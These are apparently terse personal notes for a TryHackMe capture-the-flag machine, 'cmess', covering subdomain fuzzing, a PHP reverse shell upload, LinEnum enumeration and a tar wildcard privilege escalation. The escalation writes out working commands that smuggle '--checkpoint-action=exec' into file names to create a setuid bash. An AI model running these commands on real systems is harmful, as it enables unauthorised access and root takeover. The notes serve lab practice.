add webpage to host file

ran dirsearch
ran wfuzz (find sub domain)

wfuzz -c -f sub-fighter -w top5000.txt -u 'http://cmess.thm' -H "HOst: FUZZ.cmess.thm" 

ran command again with  --hw 290 added to the end to filter trash response

add dev.cmess.thm to /etc/hosts
visited dev.cmess.thm

found andre's email and password

used them to login into admin page

uploaded php reverse shell
visited /assets/phpsell.php  (to activate reverse shell)

ran python server in my transfer directory

on tgt box wget linenum to /tmp

ran linenum found /opt/.password.bak
 ran cat got password to andre
 used it to ssh in as andre got first flag

  ![[cmess.png]]

 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
 chmod +x shell.sh 
 touch /home/andre/backup/--checkpoint=1
 touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh
/tmp/bash -p
